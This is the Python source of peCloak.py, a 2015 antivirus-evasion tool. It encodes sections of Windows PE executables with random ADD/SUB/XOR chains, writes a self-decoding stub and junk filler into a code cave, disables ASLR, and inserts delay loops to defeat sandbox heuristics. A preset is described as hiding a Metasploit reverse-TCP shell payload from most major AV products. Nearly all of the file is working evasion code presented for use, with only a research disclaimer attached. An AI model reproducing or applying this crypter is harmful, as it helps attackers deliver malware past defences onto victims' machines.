#!/usr/bin/env python

''' 
peCloak.py (beta) - A Multi-Pass Encoder & Heuristic Sandbox Bypass AV Evasion Tool
Copyright (C) 2015  Mike Czumak | T_V3rn1x | @SecuritySift
--------------------------------------------------------------------
LICENSE/WARRANTY: This program is free software: you can redistribute 
it and/or modify it under the terms of the GNU General Public License 
as published by the Free Software Foundation, either version 3 of the 
License, or(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You can obtain a copy of the GNU General Public License from:
http://www.gnu.org/licenses/.
--------------------------------------------------------------------
DISCLAIMER: This program is intended for use in research, 
sanctioned penetration testing, or other authorized security-related purposes. 
Do not use this code or any derivative of it for illegal or otherwise 
unauthorized activities. 
--------------------------------------------------------------------
PURPOSE AND USAGE EXAMPLES: Please visit www.securitysift.com 
for additional details and the latest version of this code.

Please note the external code dependencies: pydasm, pefile, SectionDoubleP 
'''

import os, sys, getopt
import pefile
import pydasm
import re
import binascii 
import struct
import time, datetime
import random
from random import randint
from SectionDoubleP import *

'''
	Split a file into chunks of designated size. Might be useful if simple encoding of the 
	text/code section is ineffective and you need to locate the offending portions
	of the pe file that are triggering signature-based detection
'''

def chunk_file (file, chunk_size):
	# make folder to hold file chunks
	target_directory = os.path.splitext(file)[0] + "_cloaked"
	timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
	target_directory += "_" + timestamp
	
	if not os.path.exists(target_directory):
		os.makedirs(target_directory)
		print "[*] Target directory [%s] created" % target_directory
	
	print "[*] Attempting to chunk file [%s] to target directory" % (file)
		
	with open(file, "rb") as f:
		byte = f.read(1)
		byte_count = 1
		chunk_count = 0
		chunk = ""
		while byte != "":
			if byte_count <= int(chunk_size):
				chunk += byte
				
			else:
				# write to file and create new chunk
				chunk_count += 1
				with open(target_directory+"\\chunk_"+str(chunk_count), 'wb') as output:
					output.write(chunk)
				
				# reset counters
				chunk = ""
				byte_count = 1
				
			byte_count += 1
			byte = f.read(1)
	print "[*] A total of %i bytes chunked into %i separate files" % (byte_count, chunk_count)
	
'''
	Get entry offset and address
	from pefile usage example on code.google.com
'''
def get_entry (pe):
	ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	ep_ava = ep+pe.OPTIONAL_HEADER.ImageBase
	return ep, ep_ava 
	
'''
	List all sections in the pe file
'''
def get_sections(pe):
	print "[*] PE Section Information Summary:"
	for section in pe.sections:
		print "\t[+] Name: %s, Virtual Address: %s, Virtual Size: %s, Characteristics: %s" % (section.Name, 
																		 hex(section.VirtualAddress), 
																		 hex(section.Misc_VirtualSize),
																		 hex(section.Characteristics))
	return
'''
	Get section header for named section
'''
def get_section_header(pe, section_name):
	for section in pe.sections:
		if section_name.strip().lower() in section.Name.strip().lower():
			return section

''' 
	print image and section header(s) 
'''			
def get_info(pe, section):
	print "[*] Printing pe file info...\n"
	get_sections(pe)
	print
	print pe.OPTIONAL_HEADER
	
	if section == "all":
		for section in pe.sections:
			header = get_section_header(pe, section.Name)
			print header
	elif section == "none":
		return
	else:
		header = get_section_header(pe, section)
		print header

''' 
	Looks for a section of enough successive null bytes to act as 
	a suitable location for the code cave within the existing sections
	so we don't have to add a new section. Skip this step with the -a option
'''
def find_codecave_space(pe, required_space):
	print "[*] Searching for suitable code cave location..."
	for section in pe.sections:
		section_header = section
		section_name = section_header.Name
		virtual_address = section_header.VirtualAddress
		code_cave_section = ""
		virtual_offset = 0
		raw_offset = 0
		
		data_to_search = retrieve_data(pe, section_name, "raw") # grab raw data from section
						
		print "\t[+] Searching %s section..." % section_name
		
		# search for code cave
		null_count = 0		
		byte_count = 0
		for byte in data_to_search:
			
			if byte == "00":
				null_count += 1
				if null_count >= required_space: # we've hit our required space limit
					raw_offset = byte_count - null_count + 2 # calculate the raw offset of the code cave for writing 
					virtual_offset = struct.pack("L",(raw_offset) + virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint) # calculate the virtual offset
					code_cave_section = section_header.Name
					print "\t[+] At least %i null bytes found in %s section to host code cave" % (null_count, code_cave_section)
					make_section_writeable(pe, code_cave_section) # section at least needs to be executable, currently make it writeable also
					return virtual_offset, raw_offset, code_cave_section
			else:
				null_count = 0
			byte_count += 1
			
	print "\t[+] No suitable code cave space found, creating a new section"
	return virtual_offset, raw_offset, code_cave_section

'''
	find (or make) location for code_cave
'''
def get_code_cave (pe, skip_cave_search):
	
	code_cave_virtual_offset = 0
	
	# if we want to try to search for an existing suitable code cave location...
	if skip_cave_search == False:
		code_cave_virtual_offset, code_cave_raw_offset, code_cave_section = find_codecave_space(pe, 1000) # look for at least 1000 consecutive null bytes
	
	# if the code cave search was skipped or did not find a suitable code cave location...
	if code_cave_virtual_offset == 0:
		print "[*] Creating new section for code cave..."
		sections = SectionDoubleP(pe)
		code_cave_section = ".NewSec"
		pe = sections.push_back(code_cave_section, VirtualSize=0x00001000, RawSize=0x00001000) # add new section to the file
		try:
			section_header = get_section_header(pe, code_cave_section)
			code_cave_virtual_address = section_header.VirtualAddress
			code_cave_virtual_offset = get_virtual_offset(code_cave_virtual_address, pe)
			code_cave_raw_offset = 0		
		except:
			print "Could not retrieve created code cave location. Check write permissions and try again."
			sys.exit(2)
			
	code_cave_address = hex(pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint + struct.unpack("L",code_cave_virtual_offset)[0])
	print "[*] Code cave located at %s" % (code_cave_address)	
	return pe, code_cave_address, code_cave_virtual_offset, code_cave_raw_offset, code_cave_section
	
'''
	Since we use the entry point and file base as our relative addresses, we need to 
	be sure they won't be changed by ASLR. Function snippet adopted from 
	https://github.com/0vercl0k/stuffz/blob/master/remove_aslr_bin.py
'''			
def disable_aslr(pe):
	IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE  = 0x40 # flag indicates relocation at run time
	if (pe.OPTIONAL_HEADER.DllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):
		pe.OPTIONAL_HEADER.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
		print "[*] ASLR disabled"
	else:
		print "[*] ASLR not enabled"

'''
	Save modified pe file
'''
def save_cloaked_pe(pe, file):
    try:
        ts = int(time.time())
        fname = os.path.splitext(file)[0] + "_" + str(ts) + "_cloaked.exe"
        pe.write(pe.OPTIONAL_HEADER.SizeOfHeaders, filename=fname) # MODIFIED WRITE FUNCTION IN PEFILE!!!
        print "[*] New file saved [" + fname + "]"	
    except:
        print "[!] ERROR: Could not save modified PE file. Check write permissions and ensure the file is not in use"
        sys.exit(2)
		
''' 
	print a range of bytes (in hex and ascii) for the named section
	starting at a given offset of the section start address
	The offset and byte count to print are handled so the user can 
	provide either a hex or a decimal value for either (interchangeable)
'''	
def print_section_bytes(pe, section_range):
	
	if section_range:
			try:
				# get name of section, range of bytes to print, header and virtual start address
				section_name = section_range.split(":")[0].lower().strip()
				start = section_range.split(":")[1].strip()
				stop = section_range.split(":")[2].strip()
				
				# handle hex conversion for either start/end value
				try: 
					format = start.split("h")[1]
					num1 = start.split("h")[0]
					start = int(num1.strip(), 16)
				except:
					start = int(start.strip())
					
				try: 
					format = stop.split("h")[1]
					num2 = stop.split("h")[0]
					stop = int(num2.strip(), 16)
				except:
					stop = int(stop.strip())
				
				
				stop = int(start) + int(stop)

			except:
				print "[!] ERROR: Invalid Parameters provided -- %s %s " % (sys.exc_info()[0], sys.exc_info()[1])
				sys.exit(2)
				
			try:
				section_header = get_section_header(pe, section_name)
				section_start_address = section_header.VirtualAddress
			except:
				print "[!] ERROR: Could not retrieve section information. Check section name and try again"
				sys.exit(2)
			
			try:
				data = retrieve_data(pe, section_name, "virtual")
				unprintable_chars = ["0a", "0d", "09", "0b"]
				offset = hex(section_start_address + start - 16)
				byte_line = ""
				char_line = ""
				total_count = 0
				line_count = 1
				
				print "[*] %i bytes of %s section at offset %sd (%s) from section section start (%s)\n\n" % ((stop - start), section_name, start, hex(start), hex(section_start_address))
				
				print "Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n"
				# print bytes, 16 at a time in both hex and ascii values
				for byte in data:
					if total_count <= int(stop):
						if total_count >= int(start):
							if line_count <= 16:
								byte_line += " "+byte
								if byte in unprintable_chars:
									char_line += "."
								else:
									byte = binascii.unhexlify(byte)
									char_line += " "+byte
								line_count += 1
							else:
								offset = hex(section_start_address + total_count - 16)
								print offset + "  " + byte_line + " || " + char_line
								line_count = 1
								byte_line = ""
								char_line = ""
					total_count += 1	
				
				# print any remaining bytes 
				if byte_line != "":
					spacers = 48 - len(byte_line)
					print hex(int(offset, 16) + 16) + "  " + byte_line + (" " * (spacers)) +" || " + char_line
					
			except:
				print "[!] ERROR: %s %s " % (sys.exc_info()[0], sys.exc_info()[1])

'''
	Return the relative jump location for the new section 
	that will hold our code cave
'''
def get_virtual_offset(virtual_address, pe):
	#return relative jump location for code cave = section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase		
	return struct.pack("L",virtual_address - pe.OPTIONAL_HEADER.AddressOfEntryPoint)	

'''
	Make section of the pe file writable
'''
def make_section_writeable(pe, name):
	for section in pe.sections:
		if (name.strip().lower() in section.Name.strip().lower()):
			if section.Characteristics != 0xE0000020:
				section.Characteristics = 0xE0000020
				print "[*] PE %s section made writeable with attribute 0xE0000020" % name
				return pe
			else:
				print "[*] Verified PE %s section is already writeable" 
				return pe
				
	print "[!] Could not make %s section writeable" % name
	return False

''' 
	Locate the physical address of the file to overwrite 
	which will be located at an offset from the PointerToRawData. This offset
	is calculated by subtracting the base code address from the entry point address.
'''	
def find_overwrite_location(pe):
	section_header = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	raw_data = section_header.PointerToRawData
	overwrite_offset = pe.OPTIONAL_HEADER.AddressOfEntryPoint - pe.OPTIONAL_HEADER.BaseOfCode
	overwrite_location = raw_data + overwrite_offset
	return overwrite_location

'''
	Various functions to modify bytes within a given section
'''
# swap case of lower and upper ASCII letters
def swap_case(byte, lowercase, uppercase):
	if byte in lowercase:
		byte = uppercase[lowercase.index(byte)]
	elif byte in uppercase:
		byte = lowercase[uppercase.index(byte)]
	return byte

# zero out all ASCII letters
def zero_letters(byte, lowercase, uppercase):
	if (byte in lowercase) or (byte in uppercase):
		byte = "00"
	return byte
	
# zero out all non-ASCII letters	
def zero_nonletters(byte, lowercase, uppercase):
	if (byte not in lowercase) and (byte not in uppercase):
		byte = "00"
	return byte

''' 
	Modify a given range of bytes in a section using the preceding modification functions
	You can do this a bit more elegantly by using a hex range and simply adding / subtracting 
	20h to obtain the corresponding swapped letter (TODO)
'''
def mod_section(pe, section_name, mod_type, mod_range):
	
	# ASCII letters hex
	lowercase = ["61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a"]
	uppercase = ["41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","48","49","5a"]
	
	try:
		make_section_writeable(pe, section_name) # make the section writeable before attempting modifications
		section_header = get_section_header(pe, section_name)
		section_start = section_header.PointerToRawData
		section_stop = section_start + section_header.Misc_VirtualSize
		data = binascii.hexlify(pe.get_memory_mapped_image()[section_start:section_stop]) 
		data = re.findall(r'.{1,2}',data,re.DOTALL)
	except:
		print "[!] ERROR: Could not retrieve section information for modification. Check section name and try again."
		sys.exit(2)
	
	try:
		if int(mod_range.split(":")[0]) < 0:
			mod_lower = 0 # if provided value is smaller than the section, use section start
		elif int(mod_range.split(":")[0]) > section_header.Misc_VirtualSize:
			print "[!] Invalid values provided for section modification range. Skipping this step"
			return
		else:
			mod_lower = int(mod_range.split(":")[0])	
		if int(mod_range.split(":")[1]) > section_header.Misc_VirtualSize:
			mod_upper = section_header.Misc_VirtualSize # if provided value is bigger than the section, use section stop
		elif int(mod_range.split(":")[1]) < mod_lower:
			print "[!] Invalid values provided for section modification range. Skipping this step"
			return
		else:
			mod_upper = int(mod_range.split(":")[1])
	except:
		print "[!] Invalid values provided for section modification range. Skipping this step"
		return
	
	modification = ""
	modified_data = ""
	count = 0
	
	while (count <= mod_upper):
		
		for byte in data:
			byte = byte.lower()
			if count in range(mod_lower, mod_upper):
				if mod_type == "1":
					byte = swap_case(byte, lowercase, uppercase)
					modification = "Letters swapped"
				elif mod_type == "2":
					byte = zero_letters(byte, lowercase, uppercase)
					modification = "Letters zeroed"
				elif mod_type == "3":
					byte = zero_nonletters(byte, lowercase, uppercase)
					modification = "Non-letters swapped"
				else:
					print "[!] Invalid mod option provided. No modification mades"
					return
			modified_data += byte
			count += 1
					
		print "[*] %s in range %i to %i in section %s" % (modification, mod_lower, mod_upper, section_name)
		
		# write encoded data to image
		print "[*] Writing modified %s section to file" % section_name
		raw_text_start = section_header.PointerToRawData
		pe.set_bytes_at_offset(raw_text_start, binascii.unhexlify(modified_data))

''' 
	various encoding functions
'''		
def do_xor(value_in, xor_val):
	xor = value_in ^ xor_val
	if (xor >= 256) or (xor < 0):
		xor = "{:02x}".format(xor & 0xffffffff)[-2:]
		xor = int(xor,16)
	return xor

def do_add(value_in, add_val):
	add = value_in + add_val 
	if (add >= 256) or (add < 0):
		add = "{:02x}".format(add & 0xffffffff)[-2:]
		add = int(add, 16)
	return add

def do_sub(value_in, sub_val):
	sub = value_in - sub_val
	if (sub >= 256) or (sub < 0):
		sub = "{:02x}".format(sub & 0xffffffff)[-2:]
		sub = int(sub, 16)
	return sub

''' 
	Generate benign filler instructions to alter the code cave signature
	The filler instructions provided here are some examples. This could be expanded (TODO)
'''	
def add_fill_instructions(limit):

	# benign filler instructions to include in the decoder
	filler_instructions = [
							"\x90", 			# NOP
							"\x60\x61",		    # PUSHAD|POPAD
							"\x9c\x9d", 		# PUSHFD|POPFD
							"\x40\x48",		 	# INC EAX|DEC EAX
							"\x41\x49", 		# INC ECX|DEC ECX
							"\x42\x4A", 		# INC EDX|DEC EDX
							"\x43\x4B", 		# INC EBX|DEC EBX
							"\x51\x31\xc9\x59",	# PUSH ECX|XOR ECX,ECX|POP ECX
							"\x52\x31\xd2\x5a",	# PUSH EDX|XOR EDX,EDX|POP EDX
							"\x53\x31\xdb\x5b"	# PUSH EBX|XOR EBX,EBX|POP EBX
						  ]
	
	# add benign filler instructions to the decoder
	num_fill_instructions = randint(1,limit)
	fill_instruction = ""
	while (num_fill_instructions > 0):
		fill_instruction += filler_instructions[randint(0,len(filler_instructions)-1)]
		num_fill_instructions -= 1
	
	return fill_instruction

''' 
	Generate the encoder instructions using pseudo-random selection for
	number, order, and modifiers
'''		
def build_encoder(heuristic_iterations):

	encoder = []
	encode_instructions = ["ADD","SUB","XOR"] # possible encode operations
	num_encode_instructions = randint(5,10) # determine the number of encode instructions

	# build the dynamic portion of the encoder
	while (num_encode_instructions > 0):
		modifier = randint(0,255)
		
		# determine the encode instruction
		encode_instruction = random.choice(encode_instructions)
		encoder.append(encode_instruction + " " + str(modifier)) 
		
		num_encode_instructions -= 1
	
	# build the last xor instruction using a pseudo-random modifier plus the number of heuristic iterations
	# TODO: use the heuristic iterations modifier as additional decode step at run time
	modifier = randint(1,100)
	encoder.append("XOR " + str(modifier + heuristic_iterations))
	
	# print the encoder
	print "[*] Generated Encoder with the following instructions:"
	for item in encoder:
		print "\t[+] %s %s" % (item.split(" ")[0], hex(int(item.split(" ")[1])))
		
	return encoder

''' 
	Generate the decoder instructions corresponding to the 
	provided encoder 
'''	
def build_decoder(pe, encoder, section, decode_start, decode_end):
	
	'''
		Our decoder should look as follows:
		
		get_address:
			mov eax, decode_start_address 		; Move address of sections's first encoded byte into EAX
		decode: 								; assume decode of at least one byte 
			...dynamic decode instructions...	; decode operations + benign fill
			inc eax								; increment decode address
			cmp eax, encode_end_address			; check address with end_address	
			jle, decode							; if in range, loop back to start of decode function
			...benign filler instructions...	; additional benign instructions that alter signature of decoder	
	'''
	decode_instructions = {
								"ADD":"\x80\x28", # add encode w/ corresponding decoder ==> SUB BYTE PTR DS:[EAX] 
								"SUB":"\x80\x00",	# sub encode w/ corresponding add decoder ==> ADD BYTE PTR DS:[EAX]
								"XOR":"\x80\x30" # xor encode w/ corresponding xor decoder ==> XOR BYTE PTR DS:[EAX]
						   }

	decoder = ""
	for i in encoder:
		encode_instruction = i.split(" ")[0] # get encoder operation
		modifier = int(i.split(" ")[1])		 # get operation modifier
		decode_instruction = (decode_instructions[encode_instruction] + struct.pack("B", modifier)) # get corresponding decoder instruction
		decoder = decode_instruction + decoder # prepend the decode instruction to execute in reverse order
		
		# add some fill instructions
		fill_instruction = add_fill_instructions(2)
		decoder = fill_instruction + decoder
	
	mov_instruct = "\xb8" + decode_start # mov eax, decode_start
	decoder = mov_instruct + decoder  # prepend the decoder with the mov instruction 
	decoder += "\x40" # inc eax
	decoder += "\x3d" + decode_end # cmp eax, decode_end
	back_jump_value = binascii.unhexlify(format((1 << 16) - (len(decoder)-len(mov_instruct)+2), 'x')[2:]) # TODO: keep the total length < 128 for this short jump
	decoder += "\x7e" + back_jump_value # jle, start_of_decode 
	decoder += "\x90\x90" # NOPS
					 
	return decoder
	
'''
	Execute various encoding operations for given input
'''
def do_encode(byte_in, encoder):	

	# encoder is built using the build_encoder() function  
	# each entry has the following format: instruction modifier
	enc = byte_in
	for entry in encoder:
		instruction = entry.strip().split(" ")[0]
		modifier = int(entry.strip().split(" ")[1])	 

		if instruction == "ADD":
			enc = do_add(enc, modifier)	
		elif instruction == "SUB":
			enc = do_sub(enc, modifier)
		else:		
			enc = do_xor(enc, modifier)
	return enc
	
'''
	Retrieve desired bytes from pe file
'''		
def retrieve_data(pe, section_name, type):
	try:
		section_header = get_section_header(pe, section_name)
		section_start=section_header.VirtualAddress
	except:
		print "[!] ERROR: Could not retrieve section data. Check the section name."
		sys.exit(2)
		
	if type == "raw":
		# grab entire section including ending nulls
		section_stop=section_start+section_header.SizeOfRawData
	else:
		# just grab up to the virtual size
		section_stop=section_start+section_header.Misc_VirtualSize
	data = binascii.hexlify(pe.get_memory_mapped_image()[section_start:section_stop]) 
	data = re.findall(r'.{1,2}',data,re.DOTALL)
	return data
	
'''
	Encode the named section(s) using multiple iterations of sub,add,xor
'''
def encode_data(pe, section_to_encode, encoder):
	
	decoder = ""
						
	# get the name of the section(s) to encode
	if section_to_encode:	
		try:
			sections = section_to_encode.split(",") # multiple sections provided
		except:
			sections = [section_to_encode] # only a single section provided
		sections = list(set(sections)) # dedupe list of sections
							
		# for each section value provided, grab the 
		# name and the range to encode
		if len(sections) > 0:
			for section in sections:	
				section = section.strip()
				
				if section:
					try:
						if len(section.split(":")) == 3:
							# name, offset, and encode_length
							section_name = section.split(":")[0]
							encode_offset = int(section.split(":")[1])
							encode_length = int(section.split(":")[2])
						elif len(section.split(":")) == 2:
							# name and offset provided
							section_name = section.split(":")[0]
							encode_offset = int(section.split(":")[1])
							encode_length = 0
						elif len(section.split(":")) == 1:
							# only name provided
							section_name = section.split(":")[0]
							encode_offset = 0
							encode_length = 0
						else:
							print "Invalid parameter provided. Use -h or --help for more info"
							sys.exit(2)
					except:
						print "[!] ERROR: Could not parse section name. Check the value provided for the -e option"
						sys.exit(2)
						
					# grab the section header
					if section_name == "default":
						# no specified section name, use section associated with entry point
						# this will typically default to the .text or .code section  
						section_header = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
						section_name = section_header.Name
					elif section_name == "":
						# skip a blank section name
						continue
					else: 
						section_header = get_section_header(pe, section_name)
						if not section_header:
							print "\n[!] ERROR: Invalid section name provided: %s. Exiting" % section_name
							sys.exit(2)
					

					# build the decoder for each section
					image_base = pe.OPTIONAL_HEADER.ImageBase
					section_start = image_base + section_header.VirtualAddress
					decode_start = struct.pack("L", section_start + encode_offset)
					
					if encode_length == 0:
						# encode / decode until the end of the section
						decode_end = struct.pack("L", section_start + section_header.Misc_VirtualSize)
					else:
						# stop encoding / decoding at desired location represented by offset + length
						decode_end = struct.pack("L", section_start + encode_offset + encode_length)
					
					decoder += build_decoder(pe, encoder, section_header, decode_start, decode_end) # now build the corresponding decoder
					encoded_data = "" # will hold encoded data
					data_to_encode = retrieve_data(pe, section_name, "virtual") # grab unencoded data from section
					
					if encode_length == 0:
						encode_length = len(data_to_encode) # encode entire section from offset
					
					if encode_offset == 0 and encode_length == len(data_to_encode):
						print "[*] Encoding entire %s section" % section_name
					else:
						print "[*] Encoding a total of %i bytes data of the %s section starting at offset %i" % (encode_length, section_name, encode_offset) 	
					
					section_size = section_header.Misc_VirtualSize
					if encode_offset > section_size:
						print "[!] Provided offset for %s larger than section size. Skipping encoding." % section_name
						continue
                    
					# generate encoded bytes
					count = 0					
					for byte in data_to_encode:
						byte = int(byte, 16)
						
						if (count >= encode_offset) and (count < encode_length + encode_offset):
							enc_byte = do_encode(byte, encoder)
							# print "Byte %i was %x and is now %x" % (count, byte, enc_byte) # TESTING
						else:
							enc_byte = byte # byte not within encoding range, maintain original value
							
						count += 1
						encoded_data = encoded_data + "{:02x}".format(enc_byte)
						
					# make target section writeable
					pe = make_section_writeable(pe, section_name)
					
					# write encoded data to image
					print "[*] Writing encoded data to file"
					raw_text_start = section_header.PointerToRawData # get raw text location for writing directly to file
					success = pe.set_bytes_at_offset(raw_text_start, binascii.unhexlify(encoded_data))
		
	return decoder				
					
'''
	Preserve the first few instructions of the binary which will be overwritten 
	with the jump to the code cave. 
'''
def preserve_entry_instructions(pe, ep, ep_ava, offset_end):
	offset=0
	original_instructions = pe.get_memory_mapped_image()[ep:ep+offset_end+30]
	print "[*] Preserving the following entry instructions (at entry address %s):" % hex(ep_ava)
	while offset < offset_end:
		i = pydasm.get_instruction(original_instructions[offset:], pydasm.MODE_32)
		asm = pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+offset)
		print "\t[+] " + asm
		offset += i.length
		
	# re-get instructions with confirmed offset to avoid partial instructions
	original_instructions = pe.get_memory_mapped_image()[ep:ep+offset]
	return original_instructions 

''' 
    calculate the new jump offset given a previous and current location
	used with the modify_entry_instructions function
'''
def update_jump_location(asm, current_address, instruction_offset):
	jmp_abs_destination = int(asm.split(" ")[1], 16) # get the intended destination
	if jmp_abs_destination < current_address:
		new_jmp_loc = (current_address - jmp_abs_destination + instruction_offset ) * -1 # backwards jump
	else:
		new_jmp_loc = current_address - jmp_abs_destination + instruction_offset # forwards jump
		
	return new_jmp_loc

'''
    Many executables have entry instructions with relative jumps which can pose a problem
    after relocation. My simple solution was to grab the absolute address from asm and
    calculate its relative offset from the current location. I then replace short jumps
    with their long jump counterparts along with the new relative jump location
	While I tested this with several example executables, I may have missed some opcodes
'''	
def modify_entry_instructions(ep_ava, original_instructions, heuristic_decoder_offset, code_cave_address):
	updated_instructions = "" # holds the modified data
	unconditional_jump_opcodes = {	  "eb":"\xe9", # jmp short
									  "e9":"\xe9", # jmp
									  "ea":"\xea", # jmp far
									  "e8":"\xe8"  # call
								 }
	conditional_jump_opcodes = { 
									  "77":"\x0f\x87", # ja/jnbe
									  "73":"\x0f\x83", # jae/jnb
									  "72":"\x0f\x82", # jb/jnae
									  "76":"\x0f\x86", # jbe/jna
									  "74":"\x0f\x84", # je/jz
									  "7f":"\x0f\x8f", # jg/jnle
									  "7d":"\x0f\x8d", # jge/jnl
									  "7c":"\x0f\x8c", # jl/jnge
									  "7e":"\x0f\x8e", # jle/jng
									  "75":"\x0f\x85", # jne/jnz
									  "71":"\x0f\x81", # jne/jnz
									  "79":"\x0f\x89", # jns
									  "7b":"\x0f\x8b", # jnp/jpo
									  "70":"\x0f\x80", # jo
									  "7a":"\x0f\x8a", # jp/jpe
									  "78":"\x0f\x88"  # js
							    }									
	
	current_offset = 0
	prior_offset = 0
	added_bytes = 0
	while current_offset < len(original_instructions):
	
		# get the asm for each instruction
		i = pydasm.get_instruction(original_instructions[current_offset:], pydasm.MODE_32)
		asm = pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+current_offset)
		
		# increment counters
		prior_offset = current_offset
		current_offset += i.length 
		
		instruct_bytes = original_instructions[prior_offset:current_offset] # grab current instruction bytes
		opcode = binascii.hexlify(instruct_bytes[0]) # extract first opcode byte
	
		# the current address = the code cave address + the length of the heuristic functions + the decoder functions + 
		# the length of the replaced entry instructions + any additional bytes we add as a result of modification
		current_address = int(code_cave_address, 16) + heuristic_decoder_offset  + prior_offset + added_bytes
			
		# check opcode to see if it's is a relative conditional or unconditional jump 
		if opcode in conditional_jump_opcodes:
			new_jmp_loc = update_jump_location(asm, current_address, 6)
			new_instruct_bytes = conditional_jump_opcodes[opcode] + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update location
		elif opcode in unconditional_jump_opcodes:
			new_jmp_loc = update_jump_location(asm, current_address, 5)
			new_instruct_bytes = unconditional_jump_opcodes[opcode]  + struct.pack("l", new_jmp_loc) # replace short jump with long jump and update locatio
		else:
			new_instruct_bytes = instruct_bytes
			
		updated_instructions += new_instruct_bytes # add to updated instructions
		added_bytes += len(new_instruct_bytes) - len(instruct_bytes) # by modifying these to long jmps we're adding bytes
		
	return updated_instructions	
	
'''
	Generate the instruction that will jump back to the new entry instruction to restore execution flow 
'''
def build_new_entry_jump(current_address, new_entry_address):

	if new_entry_address < current_address:
		new_entry_loc = (current_address + 5 - new_entry_address) * -1  # backwards jump
		jmp_instruction = "\xe9" + struct.pack("l", new_entry_loc)
	else:
		new_entry_loc = (current_address + 5 - new_entry_address) # forwards jump
		jmp_instruction = "\xe9" + struct.pack("L", new_entry_loc)
	
	return jmp_instruction


'''
	Generate the heuristic bypass time-sink code
'''	
def generate_heuristic(loop_limit):

	fill_limit = 3 # the maximum number of fill instructions to generate in between the heuristic instructions
	heuristic = ""
	heuristic += "\x33\xC0"  														# XOR EAX,EAX
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += "\x40"   															# INC EAX
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += "\x3D" + struct.pack("L", loop_limit)  							# CMP EAX,loop_limit
	short_jump = binascii.unhexlify(format((1 << 16) - (len(heuristic)), 'x')[2:])  # Jump immediately after XOR EAX,EAX
	heuristic += "\x75" + short_jump   											    # JNZ SHORT 
	heuristic += add_fill_instructions(fill_limit)									# fill
	heuristic += "\x90\x90\x90"   													# NOP
	return heuristic

'''
	This is a very basic attempt to circumvent remedial client-side sandbox heuristic scanning
	by stalling program execution for a short period of time (adjustable from options)
'''
def build_heuristic_bypass(heuristic_iterations):

	# we only need to clear these registers once
	heuristic_start = "\x90\x90\x90\x90\x90\x90" # XOR ESI,ESI
	heuristic_start += "\x31\xf6"   			 # XOR ESI,ESI
	heuristic_start += "\x31\xff"   			 # XOR EDI,EDI
	heuristic_start += add_fill_instructions(5)
	
	# compose the various heuristic bypass code segments  
	heuristic = ""	
	for x in range(0, heuristic_iterations):
		loop_limit = randint(286331153, 429496729)
		heuristic += generate_heuristic(loop_limit) #+ heuristic_xor_instruction
	print "[*] Generated Heuristic bypass of %i iterations" % heuristic_iterations
	heuristic = heuristic_start + heuristic 
	return heuristic
	
'''
	write the code cave containing the
	heuristic bypass, decoder, saved entry instructions,
	and the jump to restore the original execution flow
'''	
def write_codecave(pe, code_cave_section, code_cave_raw_offset, heuristic_bypass, decoder, modified_entry_instructions, restore_execution_flow):

	print "[*] Writing code cave to file"
	print "\t[+] Heuristic Bypass"
	print "\t[+] Decoder"
	print "\t[+] Saved Entry Instructions"
	print "\t[+] Jump to Restore Execution Flow "
	
	section_header = get_section_header(pe, code_cave_section)
	raw_data = section_header.PointerToRawData	
	code_cave = (	heuristic_bypass + 
					decoder + 
					modified_entry_instructions +
					restore_execution_flow
				)
				
	print "\t[+] Final Code Cave (len=%i):\n" % (len(code_cave))
	outline = ""
	byte_count = 0
	code_cave_split = [binascii.hexlify(code_cave)[i:i+2] for i in range(0, len(binascii.hexlify(code_cave)), 2)]
	
	# cycle through the final code cave, printing out 20 alpha-numeric characters at a time
	for byte in code_cave_split:
		if byte_count == 20:
			print "\t    " + outline
			outline = ""
			byte_count = 0
		else:
			outline += byte
			byte_count += 1
	if byte_count < 20:
		print "\t    " + outline
	print
	pe.set_bytes_at_offset(raw_data + code_cave_raw_offset, code_cave)

'''
	If you find yourself cloaking the same type of files repeatedly (such as Metasploit payloads), you can use
	this function to store known bypass configurations. For example, implementing a 3 iteration heuristic bypass
	while encoding the entire .text section and the first 30 bytes of the .data section is enough to cloak a 
	Metasploit reverse_tcp executable payload from most major AV products. Feel free to add more
'''

def execute_preset(program_name, preset, exe):

	presets = [
				("Metasploit reverse tcp (shell_reverse_tcp)"," -H 3 -e .text,.data:0:30")
			   ]
	index = 0
	if preset == "?":
		print "\nThe following preset encoding configurations are available:\n"
		for entry in presets:
			print "\t[%i] %s" % (index, entry[0])
			print "\t\tConfig:  %s\n" % entry[1] 
			index += 1
	else:
		try:
			print "\n[!] Running preset bypass configuration %s" % presets[int(preset)][0]
			print "\tConfig: %s \n" % presets[int(preset)][1]
			os.system(program_name + presets[int(preset)][1] + " \"" + exe + "\"")
		except:
			print "\n[!] ERROR: Could no execute preset. Check your option and try again. Use '?' for a list of presets"
			sys.exit(2)
	
'''
	usage
'''
def print_usage():
	print "\nUsage: peCloak.py [[options]] [path_to_pe_file] \n"
	print "To encode a file (w/ 3 heuristic bypass iterations) just call the script with a target filename and no options."
	print "For more detailed help use the --help option\n"

'''
    detailed help
'''	
def print_help():
	print "\nUsage: peCloak.py [[options]] [path_to_pe_file] \n"
	print "To encode a file (w/ 3 heuristic bypass iterations) just call the script with a target filename and no options."
	print "For abbreviated help, use the -h option\n"
